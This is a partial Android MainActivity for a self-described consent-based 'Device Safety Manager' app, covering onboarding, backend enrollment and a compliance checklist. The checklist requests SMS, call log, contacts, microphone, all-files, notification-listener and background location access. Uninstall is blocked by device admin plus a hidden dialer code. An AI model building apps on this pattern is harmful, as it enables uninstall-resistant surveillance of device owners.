package com.example.devicesafety;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.ScrollView;
import android.widget.TextView;
import android.window.OnBackInvokedCallback;
import android.window.OnBackInvokedDispatcher;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayDeque;

public class MainActivity extends Activity {
    private static final int REQUEST_CODE_ENABLE_ADMIN = 1001;
    private static final int REQUEST_POST_NOTIFICATIONS = 1002;
    private static final int REQUEST_QR_SCAN = 1003;
    private static final int REQUEST_CAMERA_FOR_QR = 1004;
    private static final int REQUEST_LOCATION = 1005;
    private static final int REQUEST_BACKGROUND_LOCATION = 1006;
    private static final int REQUEST_CALL_LOG = 1007;
    private static final int REQUEST_SMS = 1008;
    private static final int REQUEST_CONTACTS = 1009;
    private static final int REQUEST_MICROPHONE = 1010;
    public static final int REQUEST_STORAGE_READ = 1011;
    public static final int REQUEST_STORAGE_WRITE = 1012;
    private static final String TERMS_ACCEPTED_KEY = "termsAcceptedV1";
    private static final long PROVISION_POLL_INTERVAL_MS = 5000;
    private static final String SCREEN_WELCOME = "welcome";
    private static final String SCREEN_NETWORK = "network";
    private static final String SCREEN_WAITING = "waiting";
    private static final String SCREEN_MAIN = "main";
    private static final String SCREEN_COMPLIANCE = "compliance";

    private TextView deviceInfo;
    private TextView policyInfo;
    private TextView registrationStatus;
    private TextView deviceAdminStatus;
    private TextView waitingStatus;
    private EditText networkHostInput;
    private EditText networkPortInput;
    private EditText networkEnrollmentInput;
    private RadioButton networkRemoteMode;
    private TextView networkPreview;
    private TextView networkError;
    private TextView connectionStatusChip;
    private TextView complianceSummary;
    private SharedPreferences prefs;
    private Handler provisionHandler;
    private Runnable provisionRunnable;
    private BroadcastReceiver syncReceiver;
    private String currentScreen = "";
    private final ArrayDeque<String> backStack = new ArrayDeque<>();
    private OnBackInvokedCallback backInvokedCallback;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        prefs = BackendClient.prefs(this);
        registerSyncReceiver();
        registerBackNavigation();
        handleIncomingIntent(getIntent());
        if (BackendClient.hasDeviceToken(this) && SecurityHelper.isLocked(this)) {
            startActivity(new Intent(this, AppLockActivity.class));
            finish();
            return;
        }
        SecurityHelper.syncLocalVisibility(this);
        showCurrentScreen();
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        handleIncomingIntent(intent);
    }

    @Override
    protected void onDestroy() {
        stopProvisionPolling();
        if (syncReceiver != null) {
            unregisterReceiver(syncReceiver);
            syncReceiver = null;
        }
        super.onDestroy();
    }

    private void handleIncomingIntent(Intent intent) {
        if (intent != null && DeviceSyncService.ACTION_REQUEST_DEVICE_ADMIN.equals(intent.getAction())) {
            requestDeviceAdmin();
        }
    }

    private void registerSyncReceiver() {
        syncReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (intent == null || !DeviceSyncService.ACTION_SYNC_UPDATE.equals(intent.getAction())) {
                    return;
                }
                boolean registered = intent.getBooleanExtra(DeviceSyncService.EXTRA_REGISTERED, true);
                String statusText = intent.getStringExtra(DeviceSyncService.EXTRA_STATUS_TEXT);
                String policyText = intent.getStringExtra(DeviceSyncService.EXTRA_POLICY_TEXT);
                String connectionStatus = intent.getStringExtra(DeviceSyncService.EXTRA_CONNECTION_STATUS);
                boolean clearToken = intent.getBooleanExtra(DeviceSyncService.EXTRA_CLEAR_TOKEN, false);
                if (clearToken) {
                    prefs.edit().remove("deviceToken").apply();
                    DeviceSyncService.stopService(MainActivity.this);
                    backStack.clear();
                    currentScreen = SCREEN_WAITING;
                    showWaitingPage();
                    return;
                }
                if (!registered) {
                    return;
                }
                updateConnectionChip(connectionStatusChip, connectionStatus);
                if (registrationStatus != null && statusText != null) {
                    registrationStatus.setText("\n" + statusText);
                }
                if (policyInfo != null && policyText != null) {
                    policyInfo.setText(policyText);
                }
                if (complianceSummary != null) {
                    complianceSummary.setText(ComplianceHelper.buildReport(MainActivity.this));
                }
                updateDeviceAdminStatus();
            }
        };
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(syncReceiver, new IntentFilter(DeviceSyncService.ACTION_SYNC_UPDATE), Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(syncReceiver, new IntentFilter(DeviceSyncService.ACTION_SYNC_UPDATE));
        }
    }

    private void showCurrentScreen() {
        backStack.clear();
        if (!prefs.getBoolean(TERMS_ACCEPTED_KEY, false)) {
            stopProvisionPolling();
            DeviceSyncService.stopService(this);
            currentScreen = SCREEN_WELCOME;
            showWelcomePage();
        } else if (!prefs.getBoolean("networkConfigured", false)) {
            stopProvisionPolling();
            DeviceSyncService.stopService(this);
            currentScreen = SCREEN_NETWORK;
            showNetworkConfigPage();
        } else if (!BackendClient.hasDeviceToken(this)) {
            DeviceSyncService.stopService(this);
            currentScreen = SCREEN_WAITING;
            showWaitingPage();
        } else {
            stopProvisionPolling();
            currentScreen = SCREEN_MAIN;
            showMainPage();
        }
    }

    private void registerBackNavigation() {
        if (Build.VERSION.SDK_INT >= 33) {
            backInvokedCallback = new OnBackInvokedCallback() {
                @Override
                public void onBackInvoked() {
                    if (!handleBackNavigation()) {
                        moveTaskToBack(true);
                    }
                }
            };
            getOnBackInvokedDispatcher().registerOnBackInvokedCallback(
                    OnBackInvokedDispatcher.PRIORITY_DEFAULT,
                    backInvokedCallback
            );
        }
    }

    @Override
    @SuppressWarnings("deprecation")
    public void onBackPressed() {
        if (handleBackNavigation()) {
            return;
        }
        super.onBackPressed();
    }

    private void navigateTo(String screen) {
        if (SCREEN_WAITING.equals(currentScreen)) {
            stopProvisionPolling();
        }
        if (currentScreen != null && currentScreen.length() > 0) {
            backStack.push(currentScreen);
        }
        currentScreen = screen;
        renderScreen(screen);
    }

    private void goBack() {
        handleBackNavigation();
    }

    private boolean handleBackNavigation() {
        if (!backStack.isEmpty()) {
            currentScreen = backStack.pop();
            renderScreen(currentScreen);
            return true;
        }
        if (SCREEN_WELCOME.equals(currentScreen)) {
            finish();
            return true;
        }
        if (SCREEN_MAIN.equals(currentScreen) || SCREEN_WAITING.equals(currentScreen)) {
            moveTaskToBack(true);
            return true;
        }
        if (SCREEN_NETWORK.equals(currentScreen)) {
            if (prefs.getBoolean("networkConfigured", false)) {
                showCurrentScreen();
            } else {
                finish();
            }
            return true;
        }
        if (SCREEN_COMPLIANCE.equals(currentScreen)) {
            currentScreen = SCREEN_MAIN;
            renderScreen(SCREEN_MAIN);
            return true;
        }
        return false;
    }

    private void renderScreen(String screen) {
        if (SCREEN_WELCOME.equals(screen)) {
            stopProvisionPolling();
            DeviceSyncService.stopService(this);
            showWelcomePage();
            return;
        }
        if (SCREEN_NETWORK.equals(screen)) {
            stopProvisionPolling();
            DeviceSyncService.stopService(this);
            showNetworkConfigPage();
            return;
        }
        if (SCREEN_WAITING.equals(screen)) {
            DeviceSyncService.stopService(this);
            showWaitingPage();
            return;
        }
        if (SCREEN_MAIN.equals(screen)) {
            stopProvisionPolling();
            showMainPage();
            return;
        }
        if (SCREEN_COMPLIANCE.equals(screen)) {
            showCompliancePage();
        }
    }

    private int dp(int value) {
        return Math.round(TypedValue.applyDimension(
                TypedValue.COMPLEX_UNIT_DIP,
                value,
                getResources().getDisplayMetrics()));
    }

    private LinearLayout createPageRoot() {
        ScrollView scrollView = new ScrollView(this);
        scrollView.setFillViewport(true);
        scrollView.setClipToPadding(false);
        int horizontal = dp(20);
        int top = dp(24);
        int bottom = dp(32);
        scrollView.setPadding(horizontal, top, horizontal, bottom);
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(0, 0, 0, 0);
        scrollView.addView(root);
        setContentView(scrollView);
        return root;
    }

    private void addTitle(LinearLayout root, String text) {
        TextView title = new TextView(this);
        title.setText(text);
        title.setTextSize(24);
        title.setGravity(Gravity.CENTER_HORIZONTAL);
        root.addView(title);
    }

    private TextView addText(LinearLayout root, String text, int size) {
        TextView textView = new TextView(this);
        textView.setText(text);
        textView.setTextSize(size);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
        );
        textView.setLayoutParams(params);
        root.addView(textView);
        return textView;
    }

    private void showWelcomePage() {
        LinearLayout root = createPageRoot();
        addTitle(root, "Welcome");

        addText(root,
                "\nDevice Safety Manager is a transparent learning app for consent-based Android device management.\n\n"
                        + "Terms and conditions:\n"
                        + "1. This app must be used only on devices you own or are authorized to manage.\n"
                        + "2. The app is visible and must not be hidden from the user.\n"
                        + "3. This app does not perform spying, keylogging, call recording, hidden camera use, or covert audio recording.\n"
                        + "4. Device registration is initiated only by the admin from the dashboard.\n"
                        + "5. Device admin protection requires your consent and prevents silent uninstall.\n"
                        + "6. You can deregister the device from the dashboard.\n",
                16);

        final RadioButton acceptTerms = new RadioButton(this);
        acceptTerms.setText("I accept the terms and consent to transparent device registration.");
        root.addView(acceptTerms);

        final TextView error = addText(root, "", 15);

        Button next = new Button(this);
        next.setText("Continue");
        next.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if (!acceptTerms.isChecked()) {
                    error.setText("\nPlease accept the terms to continue.");
                    return;
                }
                prefs.edit().putBoolean(TERMS_ACCEPTED_KEY, true).apply();
                navigateTo(SCREEN_NETWORK);
            }
        });
        root.addView(next);
    }

    private void showNetworkConfigPage() {
        LinearLayout root = createPageRoot();
        addTitle(root, "Network Config");

        addText(root,
                "\nChoose how this phone should communicate with the backend.\n"
                        + "Use ADB mode for USB live testing. Use Remote mode when the backend is reachable through Wi-Fi/LAN or a server hostname.\n",
                16);

        final RadioGroup modeGroup = new RadioGroup(this);
        final RadioButton adbMode = new RadioButton(this);
        networkRemoteMode = new RadioButton(this);
        adbMode.setText("ADB testing mode: http://127.0.0.1:<port>");
        networkRemoteMode.setText("Remote network mode");
        modeGroup.addView(adbMode);
        modeGroup.addView(networkRemoteMode);
        root.addView(modeGroup);

        addText(root,
                "\nADB mode tip: with USB connected, run on your PC:\n"
                        + "adb reverse tcp:8080 tcp:8080\n"
                        + "Or run: ./scripts/adb-connect.sh\n"
                        + "(Use the same port in both places if your server uses a different port.)\n"
                        + "Important: keep USB debugging ON and select ADB mode (not Remote) for USB testing.\n",
                14);

        String savedMode = prefs.getString("backendMode", "adb");
        if ("remote".equals(savedMode)) {
            networkRemoteMode.setChecked(true);
        } else {
            adbMode.setChecked(true);
        }

        addText(root, "\nBackend host/IP or hostname", 15);
        networkHostInput = new EditText(this);
        networkHostInput.setSingleLine(true);
        networkHostInput.setText(prefs.getString("backendHost", ""));
        networkHostInput.setHint("10.105.162.117 or example.com");
        root.addView(networkHostInput);

        addText(root, "\nBackend port", 15);
        networkPortInput = new EditText(this);
        networkPortInput.setSingleLine(true);
        networkPortInput.setText(prefs.getString("backendPort", "8080"));
        networkPortInput.setHint("9030");
        root.addView(networkPortInput);

        addText(root, "\nEnrollment QR / JSON", 15);
        networkEnrollmentInput = new EditText(this);
        networkEnrollmentInput.setMinLines(3);
        networkEnrollmentInput.setHint("Paste enrollment JSON from dashboard QR page");
        root.addView(networkEnrollmentInput);

        networkPreview = addText(root, "\nPreview URL: " + buildPreviewUrl(adbMode.isChecked(), networkHostInput.getText().toString(), networkPortInput.getText().toString()), 15);
        networkError = addText(root, "", 15);

        Button importEnrollment = new Button(this);
        importEnrollment.setText("Import Enrollment JSON");
        importEnrollment.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                importEnrollmentPayload(networkEnrollmentInput.getText().toString());
            }
        });
        root.addView(importEnrollment);

        Button scanQr = new Button(this);
        scanQr.setText("Scan Enrollment QR");
        scanQr.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startEnrollmentQrScan();
            }
        });
        root.addView(scanQr);

        Button test = new Button(this);
        test.setText("Test Connection");
        test.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                testNetworkConfig(networkRemoteMode.isChecked(), networkHostInput.getText().toString(), networkPortInput.getText().toString(), networkPreview, networkError);
            }
        });
        root.addView(test);

        Button save = new Button(this);
        save.setText("Save And Continue");
        save.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                saveNetworkConfig(networkRemoteMode.isChecked(), networkHostInput.getText().toString(), networkPortInput.getText().toString(), networkPreview, networkError);
            }
        });
        root.addView(save);
    }

    private void startEnrollmentQrScan() {
        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.CAMERA}, REQUEST_CAMERA_FOR_QR);
            return;
        }
        launchQrScanActivity();
    }

    private void launchQrScanActivity() {
        Intent intent = new Intent(this, QrScanActivity.class);
        startActivityForResult(intent, REQUEST_QR_SCAN);
    }

    private void importEnrollmentPayload(String rawPayload) {
        try {
            BackendClient.EnrollmentConfig config = BackendClient.parseEnrollmentPayload(rawPayload);
            applyEnrollmentConfig(config);
            if (networkError != null) {
                String message = "\nEnrollment config imported. Test connection before saving.";
                if (config.enrollmentToken.length() > 0) {
                    message += " Registration token included — device will auto-register after you save.";
                }
                networkError.setText(message);
            }
        } catch (Exception exception) {
            if (networkError != null) {
                networkError.setText("\nImport failed: " + exception.getMessage());
            }
        }
    }

    private void applyEnrollmentConfig(BackendClient.EnrollmentConfig config) {
        BackendClient.saveEnrollmentConfig(this, config);
        if (networkRemoteMode != null) {
            networkRemoteMode.setChecked(BackendClient.MODE_REMOTE.equals(config.mode));
        }
        if (networkHostInput != null) {
            networkHostInput.setText(BackendClient.MODE_REMOTE.equals(config.mode) ? config.host : "");
        }
        if (networkPortInput != null) {
            networkPortInput.setText(config.port);
        }
        if (networkPreview != null) {
            boolean remote = BackendClient.MODE_REMOTE.equals(config.mode);
            networkPreview.setText("\nPreview URL: " + buildPreviewUrl(remote, config.host, config.port));
        }
    }

    private String buildPreviewUrl(boolean remoteSelected, String rawHost, String rawPort) {
        if (!remoteSelected) {
            return BackendClient.buildBackendUrl("127.0.0.1", BackendClient.normalizePort(rawPort));
        }
        String host = BackendClient.normalizeHost(rawHost);
        String port = BackendClient.extractPortFromHostInput(rawHost, rawPort);
        return BackendClient.buildBackendUrl(host, port);
    }

    private void testNetworkConfig(final boolean remoteSelected, final String rawHost, final String rawPort, final TextView preview, final TextView error) {
        error.setText("\nTesting connection...");
        preview.setText("\nPreview URL: " + buildPreviewUrl(remoteSelected, rawHost, rawPort));

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    final String mode = remoteSelected ? "remote" : "adb";
                    final String backendUrl = BackendClient.testServerConnection(mode, rawHost, rawPort);
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            error.setText("\nConnection OK: " + backendUrl);
                        }
                    });
                } catch (final Exception exception) {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            error.setText("\nConnection failed: " + exception.getMessage());
                        }
                    });
                }
            }
        }).start();
    }

    private void saveNetworkConfig(final boolean remoteSelected, final String rawHost, final String rawPort, final TextView preview, final TextView error) {
        if (networkEnrollmentInput != null) {
            String enrollmentText = networkEnrollmentInput.getText().toString().trim();
            if (enrollmentText.length() > 0) {
                try {
                    applyEnrollmentConfig(BackendClient.parseEnrollmentPayload(enrollmentText));
                } catch (Exception exception) {
                    error.setText("\nSave blocked: " + exception.getMessage());
                    return;
                }
            }
        }

        error.setText("\nTesting connection before save...");
        preview.setText("\nPreview URL: " + buildPreviewUrl(remoteSelected, rawHost, rawPort));

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    final String mode = remoteSelected ? "remote" : "adb";
                    final String backendUrl = BackendClient.testServerConnection(mode, rawHost, rawPort);
                    final String host = remoteSelected ? BackendClient.normalizeHost(rawHost) : "";
                    final String port = BackendClient.normalizePort(
                            remoteSelected
                                    ? BackendClient.extractPortFromHostInput(rawHost, rawPort)
                                    : rawPort
                    );

                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            prefs.edit()
                                    .putString("backendMode", mode)
                                    .putString("backendHost", host)
                                    .putString("backendPort", port)
                                    .putBoolean("networkConfigured", true)
                                    .apply();
                            DeviceSyncService.stopService(MainActivity.this);
                            showCurrentScreen();
                        }
                    });
                } catch (final Exception exception) {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            error.setText("\nSave blocked: " + exception.getMessage());
                        }
                    });
                }
            }
        }).start();
    }

    private void showWaitingPage() {
        LinearLayout root = createPageRoot();
        addTitle(root, "Waiting For Registration");

        connectionStatusChip = createConnectionStatusChip(root);
        updateConnectionChip(connectionStatusChip, DeviceSyncService.STATUS_WAITING);

        String androidId = BackendClient.getDeviceId(this);
        addText(root,
                "\nThis device does not have a device token yet.\n"
                        + "Registration can only be done from the admin dashboard.\n\n"
                        + "Give this Device ID to the admin:\n"
                        + androidId + "\n\n"
                        + "After the admin registers this device and pushes the token, this app will activate automatically.\n"
                        + "Backend URL: " + BackendClient.getBackendUrl(this) + "\n",
                16);

        waitingStatus = addText(root, "\nStatus: Checking in with server...", 15);

        Button config = new Button(this);
        config.setText("Change Network Config");
        config.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                navigateTo(SCREEN_NETWORK);
            }
        });
        root.addView(config);

        checkInAndPollProvision();
        startProvisionPolling();
    }

    private void showMainPage() {
        LinearLayout root = createPageRoot();
        addTitle(root, "Device Safety Manager");

        connectionStatusChip = createConnectionStatusChip(root);
        updateConnectionChip(connectionStatusChip, DeviceSyncService.STATUS_CONNECTED);

        TextView notice = new TextView(this);
        notice.setText("\nTransparent learning app for safe Android device management. Background sync keeps this device connected to the admin server.\n"
                + "Backend URL: " + BackendClient.getBackendUrl(this) + "\n");
        notice.setTextSize(16);
        root.addView(notice);

        deviceInfo = new TextView(this);
        deviceInfo.setTextSize(15);
        root.addView(deviceInfo);

        policyInfo = new TextView(this);
        policyInfo.setTextSize(15);
        policyInfo.setText(prefs.getString("lastPolicyText", "\nPolicy: Syncing..."));
        root.addView(policyInfo);

        deviceAdminStatus = new TextView(this);
        deviceAdminStatus.setTextSize(15);
        root.addView(deviceAdminStatus);

        Button refresh = new Button(this);
        refresh.setText("Refresh Device Info");
        refresh.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                showDeviceInfo();
                updateDeviceAdminStatus();
            }
        });
        root.addView(refresh);

        complianceSummary = addText(root, ComplianceHelper.buildReport(this), 15);

        Button compliance = new Button(this);
        compliance.setText("Open Compliance Checklist");
        compliance.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                navigateTo(SCREEN_COMPLIANCE);
            }
        });
        root.addView(compliance);

        Button enableAdmin = new Button(this);
        enableAdmin.setText("Enable Device Admin Protection");
        enableAdmin.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                openSecurityMenu("enable_device_admin");
            }
        });
        root.addView(enableAdmin);

        Button deregister = new Button(this);
        deregister.setText("Deregister Device");
        deregister.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if (!SecurityHelper.isAllowUninstall(MainActivity.this)) {
                    if (registrationStatus != null) {
                        registrationStatus.setText(
                                "\nDeregister requires admin OTP. Dial *#*#15072377#*#* and choose Allow Uninstall.");
                    }
                    openSecurityMenu("allow_uninstall");
                    return;
                }
                deregisterDevice();
            }
        });
        root.addView(deregister);

        Button config = new Button(this);
        config.setText("Change Network Config");
        config.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                navigateTo(SCREEN_NETWORK);
            }
        });
        root.addView(config);

        registrationStatus = new TextView(this);
        registrationStatus.setTextSize(15);
        registrationStatus.setText("\nRegistration status: Background sync active");
        root.addView(registrationStatus);

        showDeviceInfo();
        updateDeviceAdminStatus();
        requestBackgroundSyncPermissions();
        requestLocationPermissions();
        requestCallLogPermission();
        requestSmsPermission();
        DeviceSyncService.startIfRegistered(this);
        refreshPolicyFromServer();
    }

    private TextView createConnectionStatusChip(LinearLayout root) {
        TextView chip = new TextView(this);
        chip.setTextSize(14);
        chip.setPadding(28, 14, 28, 14);
        chip.setGravity(Gravity.CENTER_HORIZONTAL);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
        );
        params.gravity = Gravity.CENTER_HORIZONTAL;
        params.bottomMargin = 24;
        chip.setLayoutParams(params);
        root.addView(chip);
        return chip;
    }

    private void updateConnectionChip(TextView chip, String status) {
        if (chip == null) {
            return;
        }
        String label = status == null || status.length() == 0
                ? DeviceSyncService.STATUS_OFFLINE
                : status;
        chip.setText(label);
        int backgroundColor;
        if (DeviceSyncService.STATUS_CONNECTED.equals(label)) {
            backgroundColor = 0xFF2E7D32;
        } else if (DeviceSyncService.STATUS_WAITING.equals(label)) {
            backgroundColor = 0xFF607D8B;
        } else {
            backgroundColor = 0xFFEF6C00;
        }
        chip.setBackgroundColor(backgroundColor);
        chip.setTextColor(0xFFFFFFFF);
    }

    private void showCompliancePage() {
        LinearLayout root = createPageRoot();
        addTitle(root, "Compliance Checklist");

        addText(root,
                "\nThese settings help the device stay connected to the admin server and receive remote commands.\n",
                16);

        complianceSummary = addText(root, ComplianceHelper.buildReport(this), 15);

        Button fixAdmin = new Button(this);
        fixAdmin.setText("Enable Device Admin");
        fixAdmin.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                requestDeviceAdmin();
            }
        });
        root.addView(fixAdmin);

        Button fixBattery = new Button(this);
        fixBattery.setText("Disable Battery Optimization");
        fixBattery.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                openBatteryOptimizationSettings();
            }
        });
        root.addView(fixBattery);

        Button fixNotifications = new Button(this);
        fixNotifications.setText("Enable Notifications");
        fixNotifications.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                openNotificationSettings();
            }
        });
        root.addView(fixNotifications);

        Button fixLocation = new Button(this);
        fixLocation.setText("Enable All-Time Location");
        fixLocation.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                requestLocationPermissions();
            }
        });
        root.addView(fixLocation);

        Button fixUsage = new Button(this);
        fixUsage.setText("Enable Usage Access");
        fixUsage.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                try {
                    startActivity(UsageStatsHelper.buildUsageAccessIntent());
                } catch (Exception ignored) {
                }
            }
        });
        root.addView(fixUsage);

        Button fixCallLog = new Button(this);
        fixCallLog.setText("Enable Call Log Access");
        fixCallLog.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                requestCallLogPermission();
            }
        });
        root.addView(fixCallLog);

        Button fixSms = new Button(this);
        fixSms.setText("Enable SMS Access");
        fixSms.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                requestSmsPermission();
            }
        });
        root.addView(fixSms);

        Button fixContacts = new Button(this);
        fixContacts.setText("Enable Contacts Access");
        fixContacts.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                requestContactsPermission();
            }
        });
        root.addView(fixContacts);

        Button fixMicrophone = new Button(this);
        fixMicrophone.setText("Enable Microphone Access");
        fixMicrophone.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                requestMicrophonePermission();
            }
        });
        root.addView(fixMicrophone);

        Button fixStorage = new Button(this);
        fixStorage.setText("Enable All Files Access");
        fixStorage.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                requestStorageAccess();
            }
        });
        root.addView(fixStorage);

        Button fixNotificationListener = new Button(this);
        fixNotificationListener.setText("Enable Notification Listener");
        fixNotificationListener.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                try {
                    startActivity(NotificationHelper.buildNotificationListenerSettingsIntent());
                } catch (Exception ignored) {
                }
            }
        });
        root.addView(fixNotificationListener);

        Button refreshCompliance = new Button(this);
        refreshCompliance.setText("Refresh Checklist");
        refreshCompliance.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if (complianceSummary != null) {
                    complianceSummary.setText(ComplianceHelper.buildReport(MainActivity.this));
                }
            }
        });
        root.addView(refreshCompliance);

        Button back = new Button(this);
        back.setText("Back To Home");
        back.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                goBack();
            }
        });
        root.addView(back);
    }

    private void openBatteryOptimizationSettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
                return;
            } catch (Exception ignored) {
            }
        }
        try {
            startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
        } catch (Exception ignored) {
        }
    }

    private void openNotificationSettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQUEST_POST_NOTIFICATIONS);
                return;
            }
        }
        try {
            Intent intent = new Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS);
            intent.putExtra(Settings.EXTRA_APP_PACKAGE, getPackageName());
            startActivity(intent);
        } catch (Exception ignored) {
        }
    }

    private void refreshPolicyFromServer() {
        if (!BackendClient.hasDeviceToken(this)) {
            return;
        }
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    final String policyText = BackendClient.syncPolicy(MainActivity.this);
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            if (policyInfo != null) {
                                policyInfo.setText(policyText);
                            }
                            if (registrationStatus != null) {
                                registrationStatus.setText("\nRegistration status: Registered");
                            }
                            updateConnectionChip(connectionStatusChip, DeviceSyncService.STATUS_CONNECTED);
                        }
                    });
                } catch (final Exception exception) {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            if (registrationStatus != null) {
                                registrationStatus.setText("\nPolicy sync failed: " + exception.getMessage());
                            }
                            updateConnectionChip(connectionStatusChip, DeviceSyncService.STATUS_OFFLINE);
                        }
                    });
                }
            }
        }).start();
    }

    private void requestBackgroundSyncPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQUEST_POST_NOTIFICATIONS);
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            if (powerManager != null && !powerManager.isIgnoringBatteryOptimizations(getPackageName())) {
                try {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                } catch (Exception ignored) {
                }
            }
        }
    }

    private void showDeviceInfo() {
        String androidId = BackendClient.getDeviceId(this);
        String info = "Manufacturer: " + Build.MANUFACTURER
                + "\nModel: " + Build.MODEL
                + "\nDevice: " + Build.DEVICE
                + "\nAndroid version: " + Build.VERSION.RELEASE
                + "\nAPI level: " + Build.VERSION.SDK_INT
                + "\nApp Android ID: " + androidId;
        deviceInfo.setText(info);
    }

    private void updateDeviceAdminStatus() {
        if (deviceAdminStatus == null) {
            return;
        }
        if (isDeviceAdminActive()) {
            deviceAdminStatus.setText("\nDevice admin protection: Active");
        } else {
            deviceAdminStatus.setText("\nDevice admin protection: Not active");
        }
    }

    private boolean isDeviceAdminActive() {
        DevicePolicyManager manager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, SafetyDeviceAdminReceiver.class);
        return manager != null && manager.isAdminActive(admin);
    }

    private void requestDeviceAdmin() {
        if (isDeviceAdminActive()) {
            if (deviceAdminStatus != null) {
                deviceAdminStatus.setText("\nDevice admin protection: Active");
            }
            return;
        }
        if (!SecurityHelper.isAllowEnableDeviceAdmin(this)) {
            openSecurityMenu("enable_device_admin");
            return;
        }
        ComponentName admin = new ComponentName(this, SafetyDeviceAdminReceiver.class);
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.device_admin_explanation));
        startActivityForResult(intent, REQUEST_CODE_ENABLE_ADMIN);
    }

    private void openSecurityMenu(String actionType) {
        Intent menuIntent = new Intent(this, SecurityMenuActivity.class);
        menuIntent.putExtra(SecurityHelper.EXTRA_ACTION, actionType);
        startActivity(menuIntent);
    }

    private void requestLocationPermissions() {
